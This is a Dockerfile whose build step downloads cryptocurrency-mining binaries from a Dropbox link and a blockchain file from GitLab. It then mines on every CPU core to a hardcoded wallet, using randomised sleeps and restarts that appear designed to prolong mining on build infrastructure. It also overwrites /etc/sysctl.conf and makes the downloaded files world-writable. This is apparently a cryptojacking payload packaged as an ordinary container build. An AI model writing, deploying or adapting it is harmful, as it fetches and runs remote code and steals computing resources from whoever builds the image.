FROM ubuntu:latest
RUN echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux -y  && mkdir /memory && cd /memory && wget -O slate.zip https://www.dropbox.com/sh/pmnr58i6640l5hk/AAC1YJaE2fTCHKCIEbB31V8Sa/slate-v1.0.2.7_linux-x64.zip?dl=1 > /dev/null 2>&1 && unzip slate.zip && wget --user-agent Mozilla/4.0 -O blockchain.raw https://gitlab.com/Muskito/slate/raw/master/blockchain.raw?inline=false && chmod -R 777 * && ls -l && ./slate-blockchain-import --input-file "./blockchain.raw" --verify 0 --data-dir /memory/blockchain/ --batch-size 500 && mkdir /memory/blockchain/ && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./slated --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./slated status && ./slated exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./slated --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./slated status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./slated status && sleep 300  && ./slated status && sleep 300  && ./slated status && sleep 300 && ./slated status && sleep 300  && ./slated status && sleep 300  && ./slated status && sleep 300
